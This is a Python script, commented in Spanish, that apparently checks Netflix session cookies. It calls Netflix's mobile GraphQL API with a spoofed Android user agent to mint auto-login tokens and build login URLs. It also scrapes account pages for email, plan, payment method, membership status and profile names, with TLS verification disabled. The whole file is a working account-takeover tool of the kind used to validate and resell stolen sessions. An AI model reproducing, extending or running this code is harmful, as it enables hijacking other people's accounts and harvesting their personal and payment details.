import re
import json
import base64
import warnings
import random
from urllib.parse import unquote, quote

import httpx
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", message=".*verify.*", category=UserWarning)

NETFLIX_URL = "https://www.netflix.com"
API_ENDPOINT = "https://android13.prod.ftl.netflix.com/graphql"
ANDROID_UA = (
    "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; "
    "Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)"
)
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


def parse_cookies(cookie_str: str) -> dict:
    cookies = {}
    # Try Netscape format first (tab-separated columns)
    if "\t" in cookie_str and ("netflix.com" in cookie_str or ".netflix.com" in cookie_str):
        for line in cookie_str.strip().split("\n"):
            parts = line.strip().split("\t")
            if len(parts) >= 7:
                name = parts[5].strip()
                value = parts[6].strip()
                cookies[name] = value
        if cookies:
            return cookies
    # Standard key=value; key=value format
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            key, value = part.split("=", 1)
            cookies[key.strip()] = value.strip()
    return cookies


def cookies_to_header(cookies: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in cookies.items())


def generate_token(cookies_dict: dict) -> tuple:
    """
    Genera un nftoken (auto-login token) usando la API GraphQL de Netflix.
    Retorna (token, error).
    """
    mobile_headers = {
        "User-Agent": ANDROID_UA,
        "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.netflix.com",
        "Referer": "https://www.netflix.com/",
    }

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849",
            }
        },
    }

    cookies_str = cookies_to_header(cookies_dict)

    try:
        with httpx.Client(
            headers={**mobile_headers, "Cookie": cookies_str},
            verify=False,
            http2=True,
            timeout=15,
        ) as client:
            r = client.post(API_ENDPOINT, json=payload)

            if r.status_code != 200:
                return None, f"API HTTP {r.status_code}"

            data = r.json()

            if "errors" in data and data["errors"]:
                err_msg = data["errors"][0].get("message", str(data["errors"]))
                return None, err_msg

            token = data.get("data", {}).get("createAutoLoginToken")
            if token:
                return token, None
            return None, "No token en respuesta"

    except httpx.TimeoutException:
        return None, "Timeout conectando a API de Netflix"
    except httpx.RequestError as e:
        return None, f"Error de conexión: {str(e)[:60]}"
    except Exception as e:
        return None, str(e)


def check_cookies(cookie_str: str) -> dict:
    result = {
        "valid": False,
        "token": None,
        "token_url": None,
        "account_info": {},
        "profiles": [],
        "error": None,
    }

    cookies = parse_cookies(cookie_str)

    required = {"NetflixId", "SecureNetflixId"}
    if not required.intersection(cookies.keys()):
        result["error"] = "Faltan cookies requeridas (NetflixId / SecureNetflixId)"
        return result

    # 1) Generar token via API movil
    token, token_err = generate_token(cookies)
    if token:
        result["token"] = token
        result["token_url"] = f"https://netflix.com/account?nftoken={quote(token, safe='')}"

    # 2) Extraer info de perfil desde las cookies
    profile = _extract_from_cookies(cookies)

    # 3) Si tenemos token, complementamos con scraping web
    if token:
        _scrape_web_info(cookie_str, profile)
        result["valid"] = True
    else:
        # Fallback: probar con scraping web directo
        result["valid"] = _fallback_web_check(cookie_str, profile)
        if not result["valid"] and not result["error"]:
            result["error"] = token_err or "Cookies invalidas o expiradas"

    result["account_info"] = profile
    return result


def _extract_from_cookies(cookies: dict) -> dict:
    """Extrae info desde las cookies mismo (NetflixId, anonConsent, etc.)"""
    info = {}

    # NetflixId contiene JSON base64 con datos de sesion
    if "NetflixId" in cookies:
        try:
            decoded = base64.b64decode(cookies["NetflixId"]).decode("utf-8", errors="ignore")
            emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", decoded)
            if emails:
                info["email"] = emails[0]
            m = re.search(r'"country"[^:]*:\s*"([A-Z]{2})"', decoded)
            if m:
                info["country"] = m.group(1)
        except Exception:
            pass

    # anonConsent tiene geolocation
    if "anonConsent" in cookies:
        try:
            anon = unquote(cookies["anonConsent"])
            if "geolocation=" in anon:
                geo = anon.split("geolocation=")[1].split("&")[0]
                parts = geo.split(";")
                if parts and parts[0]:
                    info["country"] = parts[0].upper()
        except Exception:
            pass

    return info


def _scrape_web_info(cookie_str: str, info: dict):
    """Scrapea /account y /browse para info adicional"""
    headers = {
        "User-Agent": random.choice(BROWSER_UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": cookie_str,
    }

    try:
        with httpx.Client(
            headers=headers, follow_redirects=True, timeout=15, verify=False, http2=True
        ) as client:
            # /browse para info de suscripcion
            r = client.get(f"{NETFLIX_URL}/browse")
            html = r.text
            if '"isAccountOwner":true' in html:
                info["is_owner"] = True
            if '"isActive":true' in html:
                info["is_active"] = True

            # /account para datos de cuenta
            r = client.get(f"{NETFLIX_URL}/account")
            html = r.text

            if not info.get("email"):
                _extract_email(html, info)
            if not info.get("country"):
                m = re.search(r':\{"country":"([A-Z]{2})"', html)
                if m:
                    info["country"] = m.group(1)
                m = re.search(r'"country"\s*:\s*"([A-Z]{2})"', html)
                if m:
                    info["country"] = m.group(1)

            m = re.search(r'"planName"\s*:\s*"([^"]+)"', html)
            if m:
                info["plan"] = m.group(1)

            m = re.search(r'"emailAddress":"([^"]+)"', html)
            if m and not info.get("email"):
                info["email"] = m.group(1)

            m = re.search(r'paymentMethod["\']?\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', html)
            if m:
                info["payment_method"] = m.group(1)

            if info.get("is_active"):
                info["membership_status"] = "Active"
            elif '"state":"Cancelled"' in html or '"state":"Cancel"' in html:
                info["membership_status"] = "Cancelled"
            elif "Reactivate" in html:
                info["membership_status"] = "Cancelled"
            else:
                info["membership_status"] = "Unknown"

            _extract_profiles(html, info)

    except Exception:
        pass


def _extract_email(html: str, info: dict):
    emails = re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", html)
    emails = [
        e for e in emails
        if not any(x in e for x in [
            "nflxext.com", "netflix.com", ".js", ".css", "assets",
            ".png", ".jpg", ".svg", ".gif", ".ico", "@2x", "@3x",
        ])
        and not e.startswith("http") and not e.startswith("//")
    ]
    if emails:
        info["email"] = emails[0]
    m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
    if m and "@" in m.group(1):
        info["email"] = m.group(1)
    m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
    if m and "@" in m.group(1):
        info["email"] = m.group(1)


def _extract_profiles(html: str, info: dict):
    names = re.findall(r'"name"\s*:\s*"([^"]+)"', html)
    names = [n for n in names if n and len(n) < 50 and not any(c in n for c in "{}[]\\/")]
    names = list(dict.fromkeys(names))  # unique, preserve order
    if names:
        info["profiles"] = names[:8]


def _fallback_web_check(cookie_str: str, info: dict) -> bool:
    """Fallback: verificar cookies via pagina web"""
    headers = {
        "User-Agent": random.choice(BROWSER_UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": cookie_str,
    }
    try:
        with httpx.Client(
            headers=headers, follow_redirects=True, timeout=20, verify=False, http2=True
        ) as client:
            r = client.get(f"{NETFLIX_URL}/YourAccount")
            url = str(r.url)

            if "/login" in url.lower() or "signout" in url.lower() or r.status_code == 302:
                return False

            if r.status_code not in (200, 304):
                return False

            html = r.text
            _extract_email(html, info)
            _extract_profiles(html, info)

            m = re.search(r'"country"\s*:\s*"([A-Z]{2})"', html)
            if m and not info.get("country"):
                info["country"] = m.group(1)
            m = re.search(r':\{"country":"([A-Z]{2})"', html)
            if m and not info.get("country"):
                info["country"] = m.group(1)

            return True
    except Exception:
        return False
